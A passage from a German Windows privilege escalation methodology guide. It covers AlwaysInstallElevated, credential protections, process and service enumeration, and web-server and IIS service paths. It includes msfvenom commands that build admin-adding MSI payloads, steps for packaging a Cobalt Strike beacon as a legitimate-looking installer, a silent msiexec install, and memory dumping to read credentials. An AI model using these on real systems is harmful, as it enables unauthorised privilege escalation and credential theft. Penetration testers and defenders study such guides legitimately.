Prüfen Sie die Richtlinie des tatsächlichen DC für [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) und [LDAPS channel binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), die Objekt-ACL der weitergeleiteten Identität sowie die Authentifizierungs- und Identitätswechselebenen der ausgewählten COM-Klasse. Anmeldetyp und Anmeldeinformationskontext des Aufrufers spielen eine Rolle: Eine WinRM-Sitzung kann sich anders verhalten als eine interaktive Anmeldung oder eine Anmeldung mit neuen Anmeldeinformationen. Auch Firewall-/OXID-Routing und installierte Updates können das Ergebnis beeinflussen. Betrachten Sie eine permissive Richtlinie oder eine passende ACL als prüfenswert; eine passive Aufzählung sollte keine COM-Coercion, Relay-Authentifizierung oder Verzeichnisschreibvorgänge auslösen. Eine Shadow Credential für ein Computerkonto kann zu einem Maschinen-Ticket führen und nur dann, wenn dieses Konto über die erforderlichen Verzeichnisreplikationsrechte verfügt, zu einem separaten DCSync-Pfad.

Finden Sie den **Exploit unter** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Weitere Informationen zum Ablauf des Angriffs finden Sie unter [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Wenn** diese beiden Registrierungsschlüssel **aktiviert** sind (Wert **0x1**), können Benutzer jeder Privilegstufe `*.msi`-Dateien als NT AUTHORITY\\**SYSTEM** **installieren** (ausführen).

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Wenn Sie über eine Meterpreter-Sitzung verfügen, können Sie diese Technik mit dem Modul **`exploit/windows/local/always_install_elevated`** automatisieren.

### PowerUP

Verwenden Sie den Befehl `Write-UserAddMSI` von PowerUp, um im aktuellen Verzeichnis eine Windows-MSI-Binärdatei zur Rechteausweitung zu erstellen. Dieses Skript schreibt ein vorkompiliertes MSI-Installationsprogramm, das zum Hinzufügen eines Benutzers/einer Gruppe auffordert (Sie benötigen also GUI-Zugriff):

```
Write-UserAddMSI
```

Führe einfach die erstellte Binärdatei aus, um die Berechtigungen zu erhöhen.

### MSI Wrapper

Lies dieses Tutorial, um zu erfahren, wie du mit diesem Tool einen MSI Wrapper erstellst. Beachte, dass du eine „**.bat**“-Datei verpacken kannst, wenn du **nur** **Befehlszeilen ausführen** möchtest.

{{#ref}}
msi-wrapper.md
{{#endref}}

### MSI mit WIX erstellen


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### MSI mit Visual Studio erstellen

- **Erzeuge** mit Cobalt Strike oder Metasploit ein **neues Windows EXE TCP payload** unter `C:\privesc\beacon.exe`.
- Öffne **Visual Studio**, wähle **Create a new project** und gib „installer“ in das Suchfeld ein. Wähle das Projekt **Setup Wizard** und klicke auf **Next**.
- Gib dem Projekt einen Namen, zum Beispiel **AlwaysPrivesc**, verwende `C:\privesc` als Speicherort, wähle **place solution and project in the same directory** und klicke auf **Create**.
- Klicke auf **Next**, bis du zu Schritt 3 von 4 gelangst (Dateien zum Einschließen auswählen). Klicke auf **Add** und wähle das gerade erzeugte Beacon payload aus. Klicke dann auf **Finish**.
- Markiere das Projekt **AlwaysPrivesc** im **Solution Explorer** und ändere in den **Properties** den Wert von **TargetPlatform** von **x86** zu **x64**.
  - Du kannst weitere Eigenschaften ändern, etwa **Author** und **Manufacturer**, damit die installierte App legitimer wirkt.
- Klicke mit der rechten Maustaste auf das Projekt und wähle **View > Custom Actions**.
- Klicke mit der rechten Maustaste auf **Install** und wähle **Add Custom Action**.
- Doppelklicke auf **Application Folder**, wähle die Datei **beacon.exe** aus und klicke auf **OK**. Dadurch wird sichergestellt, dass das Beacon payload direkt nach dem Start des Installationsprogramms ausgeführt wird.
- Ändere unter **Custom Action Properties** den Wert von **Run64Bit** auf **True**.
- **Erstelle** schließlich das Projekt.
  - Wenn die Warnung `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` angezeigt wird, vergewissere dich, dass die Plattform auf x64 eingestellt ist.

### MSI-Installation

So führst du die **Installation** der schädlichen `.msi`-Datei **im Hintergrund** aus:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Um diese Sicherheitslücke auszunutzen, kannst du Folgendes verwenden: _exploit/windows/local/always_install_elevated_

## Antivirus und Erkennungsmechanismen

### Überwachungseinstellungen

Diese Einstellungen legen fest, was **protokolliert** wird. Daher solltest du darauf achten.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding: Es ist interessant zu wissen, wohin die Logs gesendet werden.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** dient der **Verwaltung lokaler Administratorpasswörter** und stellt sicher, dass jedes Passwort auf in eine Domäne eingebundenen Computern **einzigartig, zufällig und regelmäßig aktualisiert** ist. Diese Passwörter werden sicher in Active Directory gespeichert und können nur von Benutzern eingesehen werden, denen über ACLs ausreichende Berechtigungen erteilt wurden.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Wenn aktiv, werden **Klartextpasswörter in LSASS** (Local Security Authority Subsystem Service) gespeichert.\
[**Weitere Informationen zu WDigest auf dieser Seite**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA-Schutz

Ab **Windows 8.1** führte Microsoft einen erweiterten Schutz für die Local Security Authority (LSA) ein, um Versuche nicht vertrauenswürdiger Prozesse zu **blockieren**, ihren **Speicher auszulesen** oder Code einzuschleusen und so das System zusätzlich abzusichern.\
[**Weitere Informationen zum LSA-Schutz hier**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** wurde in **Windows 10** eingeführt. Es soll auf einem Gerät gespeicherte Anmeldeinformationen vor Bedrohungen wie Pass-the-Hash-Angriffen schützen. [**Weitere Informationen zu Credential Guard finden Sie hier.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Zwischengespeicherte Anmeldedaten

**Domänenanmeldedaten** werden von der **Local Security Authority** (LSA) authentifiziert und von Betriebssystemkomponenten verwendet. Wenn die Anmeldedaten eines Benutzers von einem registrierten Sicherheitspaket authentifiziert werden, werden üblicherweise Domänenanmeldedaten für diesen Benutzer eingerichtet.\
[**Weitere Informationen zu zwischengespeicherten Anmeldedaten**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Benutzer & Gruppen

### Benutzer & Gruppen auflisten

Du solltest prüfen, ob eine der Gruppen, denen du angehörst, interessante Berechtigungen hat.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Privilegierte Gruppen

Wenn du **Mitglied einer privilegierten Gruppe bist, kannst du möglicherweise deine Berechtigungen erweitern**. Erfahre hier mehr über privilegierte Gruppen und wie du sie missbrauchen kannst, um deine Berechtigungen zu erweitern:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token-Manipulation

**Erfahre mehr** darüber, was ein **Token** ist, auf dieser Seite: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Sieh dir die folgende Seite an, um **mehr über interessante Tokens** und deren Missbrauch zu erfahren:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Angemeldete Benutzer / Sitzungen

```bash
qwinsta
klist sessions
```

### Home-Verzeichnisse

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Kennwortrichtlinie

```bash
net accounts
```

### Inhalt der Zwischenablage abrufen

```bash
powershell -command "Get-Clipboard"
```

## Laufende Prozesse

### Datei- und Ordnerberechtigungen

Prüfe zunächst beim Auflisten der Prozesse, **ob sich Passwörter in der Befehlszeile des Prozesses befinden**.\
Prüfe, ob du **eine laufende Binärdatei überschreiben kannst** oder Schreibberechtigungen für den Ordner der Binärdatei hast, um mögliche [**DLL Hijacking attacks**](dll-hijacking/index.html) auszunutzen:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Prüfe immer, ob [**electron/cef/chromium debuggers** laufen, die du zur Privilegieneskalation missbrauchen könntest](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Ein debugger listener kann nur kurzzeitig verfügbar sein. Dass er in einer einzelnen passiven Portaufnahme nicht zu sehen ist, beweist daher nicht, dass er nie exponiert war. Ordne jeden beobachteten Listener seiner PID und dem Prozesseigentümer zu und prüfe, ob der Benutzer mit niedrigeren Rechten ihn erreichen kann. Ein Anwendungsname oder ein Debug-Flag allein belegt keine Codeausführung benutzerübergreifend. Beschränke die routinemäßige Aufklärung auf passive Methoden, statt debugger-Befehle zu senden.

**Berechtigungen der Prozess-Binärdateien prüfen**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Berechtigungen der Ordner der Prozess-Binärdateien überprüfen (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort-Verzeichnisse für dynamische Präprozessoren

Snort 2 kann Shared Libraries aus einem `dynamicpreprocessor directory` laden, das in der mit `snort.exe -c <config>` ausgewählten Konfiguration angegeben ist. Prüfe bei einer geplanten Aufgabe oder einem Dienst, der Snort unter einem anderen Konto ausführt, genau diese Konfiguration und die ACL des angegebenen Modulverzeichnisses. Wenn dein Token dort Dateien erstellen kann, kommt der Pfad als möglicher Ort für Codeausführung infrage, wenn die Aufgabe oder der Dienst das nächste Mal Module lädt. Überprüfe die effektiven Berechtigungen des Ausführungskontos, die aktive Konfiguration, die Modulkompatibilität sowie etwaige Einschränkungen durch Verweigerungs- oder Freigaberegeln; ein beschreibbares Verzeichnis allein begründet keine Rechteausweitung. [Snorts Dokumentation zu dynamischen Präprozessoren](https://www.snort.org/documents/dpx-readme) beschreibt das Laden von Modulen zur Laufzeit.

### Privilegierter Webdienst mit beschreibbarem Dokumentenstammverzeichnis

Vergleiche bei einer Windows-Apache-Installation den Pfad der ausführbaren Datei des Dienstes und das Ausführungskonto mit dem `DocumentRoot` in der aktiven `httpd.conf`. Prüfe bei einem herkömmlichen XAMPP-Layout `C:\xampp\apache\conf\httpd.conf` und die ACL des darin konfigurierten Dokumentenstammverzeichnisses, häufig `C:\xampp\htdocs`. Wenn ein Benutzer mit niedrigeren Berechtigungen in diesem Verzeichnis Dateien erstellen kann, während Apache als `LocalSystem` ausgeführt wird, kann die serverseitige Codeausführung die Privilegiengrenze des Hosts überschreiten. Bestätige, dass der Dienst ausgeführt wird, der genaue Pfad bereitgestellt wird und ein serverseitiger Handler den Dateityp verarbeitet; ein beschreibbares Stammverzeichnis belegt für sich genommen nur die Möglichkeit, Dateien zu erstellen. Prüfe die ACLs, ohne eine Testdatei zu schreiben:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Bei einer herkömmlichen WAMP-Installation verweist der Dienst möglicherweise auf eine versionierte `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (oder bei einem 32-Bit-Layout auf `C:\wamp\...`). Die Konfiguration liegt daneben unter `conf\httpd.conf`, und das Standard-Stammverzeichnis ist `C:\wamp64\www` oder `C:\wamp\www`. Prüfen Sie gemeinsam das genaue Dienstabbild, die Run-as-Identität, das effektive `DocumentRoot` (einschließlich der `${INSTALL_DIR}`-Ersetzung und Virtual-Host-Überschreibungen) sowie die ACL des Stammverzeichnisses. Ein beschreibbares WAMP-Verzeichnis belegt weder, dass Apache als `SYSTEM` läuft, noch, dass die übermittelte Datei ausgeführt wird. [Apache dokumentiert, wie ein Windows-Dienst seine Konfiguration auswählt](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Beschreibbares IIS-Stammverzeichnis und Netzwerkidentität des Anwendungspools

Ordnen Sie bei IIS ein beschreibbares physisches Verzeichnis in `applicationHost.config` einer **aktiven Website/Anwendung** zu und ermitteln Sie anschließend den konfigurierten Pool und den serverseitigen Handler. In einem bereitgestellten Verzeichnis abgelegter Code wird nur dann als Pool ausgeführt, wenn IIS diesen Dateityp verarbeitet und die Route erreichbar ist. Prüfen Sie die effektiven Berechtigungen des aktuellen Benutzers zum Erstellen von Dateien, den Laufzeitstatus der Website, den Handler und pfadspezifische Überschreibungen, bevor Sie ein beschreibbares Verzeichnis als Codeausführungsmöglichkeit einstufen.

Die dynamische ASP.NET-Kompilierung eröffnet einen separaten Prüfpfad: generierte Dateien im Kompilierungsverzeichnis der Anwendung. Standardmäßig ist dies ein Verzeichnis `Temporary ASP.NET Files` unter der entsprechenden .NET-Framework-Installation; `<compilation tempDirectory>` der Anwendung kann den Pfad jedoch ändern. [Microsoft dokumentiert den Speicherort und die anwendungsspezifischen Unterverzeichnisse](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) und [empfiehlt, Kompilierungsverzeichnisse voneinander zu isolieren, wenn sich Anwendungspools nicht gegenseitig vertrauen](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Kann ein Token mit geringeren Berechtigungen generierten Quellcode im Cache der **konkreten** Anwendung ändern, prüfen Sie, ob diese Anwendung ihn unter einer höher privilegierten [Workerprozessidentität](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) erneut kompiliert. Eine Datei- oder Verzeichnis-ACL allein belegt keine Codeausführung: Stellen Sie den Zusammenhang zwischen Cache, aktiver Anwendung, effektivem Token und ACL, Kompilierungseinstellungen, Prozessidentität und Zeitpunkt einer etwaigen Neukompilierung her. Prüfen Sie Metadaten nur lesend; lösen Sie bei der Enumeration keine Kompilierung aus und ändern Sie keine Cache-Dateien.

Ein IIS-Pool mit der Einstellung `ApplicationPoolIdentity` oder `NetworkService` authentifiziert sich gegenüber Domänenressourcen üblicherweise mit dem **Computerkonto des Hosts**, auch wenn sein lokales Token nur geringe Berechtigungen hat. `LocalSystem` verfügt lokal bereits über hohe Berechtigungen und verwendet im Netzwerk ebenfalls das Computerkonto; `LocalService` verwendet normalerweise anonyme Netzwerkanmeldeinformationen. Ein Pool mit `SpecificUser` verwendet stattdessen das konfigurierte Konto. [Microsoft dokumentiert diese Identitätstypen](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) und [die Netzwerkidentität des Anwendungspools](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Eine nicht angegebene Identitätseinstellung kann die Standardwerte des Pools übernehmen, die sich je nach IIS-Generation unterscheiden. Ermitteln Sie daher die effektive Konfiguration, statt anhand des Poolnamens zu raten. Erreicht die Codeausführung einen Pool mit der Netzwerkidentität des Computerkontos, prüfen Sie die Verzeichnisrechte **dieses konkreten Computers**. [DCSync](../active-directory-methodology/dcsync.md) erfordert Replikationsrechte auf dem Domänennamenskontext; ein Maschin account-Ticket oder eine Hostrolle allein weist diese Rechte nicht nach. Bei der passiven Enumeration sollten Sie Konfiguration und ACLs prüfen, ohne Dateien hochzuladen, eine Netzwerkauthentifizierung durchzuführen oder Tickets anzufordern.

Verfolgen Sie bei einem lesbaren ASP.NET-Handler, der einen Hilfsprozess startet, jeden aus einer Anfrage stammenden Wert durch Authentifizierung, Entschlüsselung, Validierung und Befehlserstellung. Ein Handler, der ein dekodiertes Token mit `ProcessStartInfo("cmd", "/c ...")` verkettet, kann Shell-Metazeichen zur Änderung des Befehls ausnutzen; [Microsoft dokumentiert die Sonderzeichen von `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Stellen Sie fest, dass ein nicht vertrauenswürdiger Aufrufer den dekodierten Wert tatsächlich beeinflussen und den Handler erreichen kann. Ermitteln Sie anschließend die effektive Identität des Anwendungspools oder des impersonierten Benutzers sowie die Identität des untergeordneten Prozesses. Eine lesbare Quellcodezeile, ein Listener auf localhost oder eine Schwachstelle im Tokenformat allein belegen keine Ausführung privilegierter Befehle. Prüfen Sie Quellcode und Poolkonfiguration, ohne gefälschte Anfragen zu senden oder den Hilfsprozess während der passiven Enumeration auszuführen.

Bei einem PHP-Dienst unter Windows kann ein durch die Anfrage gesteuerter Pfad, der an [`include` oder `require`](https://www.php.net/manual/en/function.include.php) übergeben wird, eine PHP-Datei auswerten, die ein Benutzer mit geringeren Berechtigungen ändern kann – und zwar mit der Identität des Workers. Bestätigen Sie, dass die Anfrage diese Anweisung erreichen kann, der aufgelöste Pfad auf eine Datei verweist, die der Benutzer mit geringeren Berechtigungen ändern und der Worker lesen kann, die geltenden PHP-Pfadbeschränkungen das Einbinden zulassen und der Worker tatsächlich mit höheren Berechtigungen läuft. Ein Listener auf Loopback oder eine beschreibbare Datei allein belegt diese Angriffskette nicht. Prüfen Sie Quellcode, Dienstidentität und Datei-ACLs, ohne den Endpunkt während der passiven Enumeration aufzurufen.

### Passwortsuche im Arbeitsspeicher

Mit **procdump** aus Sysinternals können Sie einen Speicherauszug eines laufenden Prozesses erstellen. Dienste wie FTP halten **Anmeldedaten im Klartext im Arbeitsspeicher**. Versuchen Sie, den Speicher auszulesen und die Anmeldedaten zu lesen.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Unsichere GUI-Apps

**Als SYSTEM ausgeführte Anwendungen können es einem Benutzer ermöglichen, eine CMD zu starten oder Verzeichnisse zu durchsuchen.**

Beispiel: „Windows-Hilfe und Support“ (Windows + F1), nach „Eingabeaufforderung“ suchen und auf „Klicken, um die Eingabeaufforderung zu öffnen“ klicken

### Import privilegierter Projektdateien

Eine Anwendung, die Projekte automatisch aus einem für Benutzer mit niedrigerer Berechtigung beschreibbaren Drop-Verzeichnis öffnet, überschreitet unter dem Konto des Importers eine Vertrauensgrenze für Eingaben. Prüfen Sie den **genauen beschreibbaren Pfad**, den Prozess oder Task, der ihn öffnet, dessen effektive Identität und den Parser-Build. Ein [historisches Problem beim Öffnen/Wiederherstellen von Ghidra-Projekten](https://github.com/NationalSecurityAgency/ghidra/issues/71) ermöglichte externe XML-Entitäten in Projektmetadaten; eine Netzwerkentität unter Windows konnte eine Authentifizierung über das importierende Konto auslösen, sofern die [Richtlinie für ausgehendes SMB und NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) dies zulässt. Das ist ein Hinweis auf mögliche Offenlegung von Zugangsdaten, kein unmittelbarer Administratorzugriff: Die Antwort muss über einen separaten autorisierten oder anfälligen Pfad nutzbar sein, und aktuelle Builds müssen anhand ihres tatsächlichen Patch-Status bewertet werden. Öffnen Sie bei der passiven Enumeration kein manipuliertes Projekt; prüfen Sie den Import-Workflow und die ACLs.

## Dienste

Das Recht [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) für das Service Control Manager (SCM)-Objekt ist von den Rechten für einen bestehenden Dienst getrennt. Eine erfolgreiche schreibgeschützte [`OpenSCManager`-Zugriffsanfrage](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) für dieses Recht ist ein Prüfhinweis, aber kein Beweis dafür, dass ein neuer Dienst ausgeführt werden kann. [`CreateService` gibt ein Handle zurück](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew), das die beim Erstellen angeforderten Dienstzugriffsrechte besitzt; ein späteres erneutes Öffnen des Dienstes führt eine separate Zugriffskontrolle durch und kann fehlschlagen, selbst wenn das ursprüngliche Handle verwendet werden könnte. Prüfen Sie getrennt den effektiven lokalen oder Remote-Token, die gewährten Handle-Rechte, das Dienstkonto, die Start-Richtlinie und den ausführbaren Pfad. Erstellen oder starten Sie während der passiven Enumeration keinen Dienst.

Bei einem Remote-Pfad zur Dienstinstallation sollten Sie diese SCM-Rechte mit einer Freigabe auf dem Ziel abgleichen, in die **dieselbe Netzwerkanmeldung** schreiben kann, sowie mit der zugrunde liegenden NTFS-ACL und einem lokalen ausführbaren Pfad, den das Dienstkonto ausführen kann. Ein Konto ohne Administratorrechte kann diese Grenze überschreiten, wenn ungewöhnlich weitreichende SCM-Rechte und der Pfad zum Ablegen der Datei beide vorhanden sind; eine administrative Freigabe ist keine zwingende Voraussetzung. Schreibzugriff auf eine Freigabe allein oder ein Hinweis auf das Recht, einen Dienst zu erstellen, belegt nicht, dass der neue Dienst mit einer höheren Identität gestartet werden kann.

Ein bestehender Dienst kann beim Start, Herunterfahren oder einem anderen Lebenszyklusereignis eine Hilfsdatei aufrufen, auch wenn diese in seinem `ImagePath` fehlt. Wird der Name der Hilfsdatei in ein für Benutzer mit niedrigerer Berechtigung beschreibbares Verzeichnis aufgelöst und läuft der Dienst mit einer höheren Identität, kann eine fehlende Hilfsdatei unter bestimmten Bedingungen ersetzt werden. Bestätigen Sie den **tatsächlichen Dienstcode oder den dokumentierten Aufruf der Hilfsdatei**, den aufgelösten ausführbaren Pfad und die Suchreihenfolge, die Verzeichnis-Erstellungsrechte, die Dienstidentität und einen verfügbaren Auslöser für den Lebenszyklus. Ein beschreibbares Dienstverzeichnis oder eine fehlende Datei allein belegt nicht, dass der Dienst die Datei lädt; starten oder beenden Sie den Dienst bei der passiven Prüfung nicht.

Bei einem bestehenden Dienst ermöglicht [`SERVICE_START` das Übergeben von Argumenten an `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); dieses Recht ist von [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) zu unterscheiden. Prüfen Sie den Dienstcode oder die dokumentierte Schnittstelle, bevor Sie das Startrecht als mehr als ein Steuerungsrecht einstufen. Wenn der Dienst ein vom Aufrufer gewähltes Argument als Protokoll- oder Exportpfad verwendet, prüfen Sie die Dienstidentität, den genauen Ablauf von Argument zu Schreibvorgang, Pfadbeschränkungen und die Berechtigungen der **erstellten Datei**. Ein Schreibvorgang in ein geschütztes Verzeichnis kann nur dann zur Rechteausweitung führen, wenn ein separater privilegierter Verbraucher oder Loader diese Datei akzeptiert; ein beschreibbares Protokoll oder ein Startrecht allein reicht nicht aus. Die passive Bestandsaufnahme sollte den Dienst weder starten noch eine Testdatei erstellen.

Bei einem NSClient++-Überwachungsagenten ist eine lesbare `nsclient.ini` ein **Hinweis für eine Konfigurationsprüfung**: Sie kann Zugangsdaten für das Webinterface enthalten, während `boot.ini` die Konfiguration an einen anderen Ort umleiten kann. Prüfen Sie das tatsächliche Dienstkonto, den WEB-Listener und die Zugriffsrichtlinie sowie, ob die authentifizierte Rolle Einstellungen oder Skripte ändern kann. Eine privilegierte Ausführung erfordert zusätzlich `CheckExternalScripts` (oder einen anderen aktivierten Ausführungspfad), ein wirksames Recht zum Registrieren oder Ändern eines Befehls und einen Auslöser, der diesen unter der Dienstidentität ausführt. Ein nur an Loopback gebundener Listener kann für einen lokalen Benutzer dennoch erreichbar sein, aber der Dateipfad, das Passwort oder der Listener allein belegen diese Rechte nicht. Prüfen Sie Metadaten und Berechtigungen, ohne Geheimnisse anzuzeigen oder während der passiven Enumeration die Web-API aufzurufen. Siehe [NSClient++-Dateilayout](https://nsclient.org/docs/concepts/file-layout/), [Sicherheitshinweise zu Webinterface und Skripten](https://nsclient.org/docs/setup/securing/) und [Konfiguration externer Skripte](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Bei einem Dienst, dessen `ImagePath` auf `nssm.exe` verweist, prüfen Sie das tatsächliche Ausführungskonto des Dienstes und dessen Wert `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM speichert die untergeordnete Anwendung dort](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), während `AppDirectory` das konfigurierte Arbeitsverzeichnis ist. Prüfen Sie die untergeordnete ausführbare Datei und die ACLs ihrer übergeordneten Verzeichnisse, bevor Sie die Berechtigungen des Wrappers als vollständige Dienstgrenze betrachten. Ein vom untergeordneten Prozess offengelegter lokaler WCF- oder SOAP-Endpunkt ist ein separater Prüfhinweis: Bestätigen Sie, dass der Benutzer mit niedrigerer Berechtigung den Listener erreichen kann, der genaue Vorgang seine Eingabe akzeptiert und der untergeordnete Dienstprozess den unsicheren Vorgang mit einer höheren Identität ausführt. Das Dienstkonto, eine Endpunkt-URL oder ein beschreibbarer Pfad allein beweisen keine Rechteausweitung; rufen Sie während der passiven Enumeration keine Dienstvorgänge auf.

Bei einem benutzerdefinierten WCF-Vorgang verfolgen Sie eine vom Aufrufer kontrollierte Zeichenfolge bis in eine PowerShell-Runspace. [`Pipeline.Commands.AddScript` fügt Skripttext hinzu](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), und [`Pipeline.Invoke` führt die Pipeline aus](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). Eine [`netTcpBinding` mit Windows-Transportanmeldeinformationen](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) authentifiziert den Client, aber die Berechtigung zum Aufrufen dieses **bestimmten** Vorgangs und die effektive Identität der Runspace müssen separat geprüft werden. Ein Pfad von einer Eingabe eines Aufrufers mit niedrigerer Berechtigung zu `AddScript`, das unter einer höheren Dienstidentität ausgeführt wird, bildet eine Codeausführungsgrenze; ein lauschender Port, ein authentifizierter Client oder eine ungenutzte Methode in einer nicht zugehörigen Assembly allein ist kein Beweis. Prüfen Sie den bereitgestellten Dienst, den Vertrag, die Autorisierung und die Identitätswechsel-Einstellungen statisch, ohne den Endpunkt während der Enumeration aufzurufen.

Service Triggers ermöglichen es Windows, einen Dienst bei bestimmten Ereignissen zu starten (Aktivität an Named Pipes/RPC-Endpunkten, ETW-Ereignisse, IP-Verfügbarkeit, Geräteanschluss, GPO-Aktualisierung usw.). Selbst ohne SERVICE_START-Rechte können Sie privilegierte Dienste oft durch Auslösen ihrer Trigger starten. Techniken zur Enumeration und Aktivierung finden Sie hier:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Diagnosesammlerdienst von Visual Studio

Visual-Studio-Installationen mit C/C++-Tools können `VSStandardCollectorService150` enthalten, einen Diagnosedienst, der für die Ausführung als `LocalSystem` konfiguriert ist. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) nutzte eine Junction und eine Race Condition mit einem Object-Manager-Link, um eine Zurücksetzung der Dienst-DACL umzuleiten. Die demonstrierte Rechteausweitung erforderte außerdem einen nutzbaren Reparaturpfad über das Visual Studio Setup WMI Provider MSI und dessen Ziel `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Die Komponente wurde im Januar 2024 korrigiert.

Prüfen Sie bei der passiven Triage das Konto und den Binärpfad dieses einen Dienstes, kontrollieren Sie, ob der Setup-WMI-Compilerpfad vorhanden ist, und verifizieren Sie den Patch-Status der installierten Komponente. Ein Diensteintrag, eine Visual-Studio-Produktversion oder eine Compilerdatei allein belegen nicht, dass der Host anfällig ist. Für die Prüfung muss der Dienst weder gestartet noch eine Reparatur ausgeführt werden.

Rufen Sie eine Liste der Dienste ab:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Berechtigungen

Du kannst **sc** verwenden, um Informationen zu einem Dienst abzurufen.

```bash
sc qc <service_name>
```

Es wird empfohlen, die Binärdatei **accesschk** von _Sysinternals_ zu verwenden, um die erforderliche Berechtigungsstufe für jeden Dienst zu überprüfen.

```bash
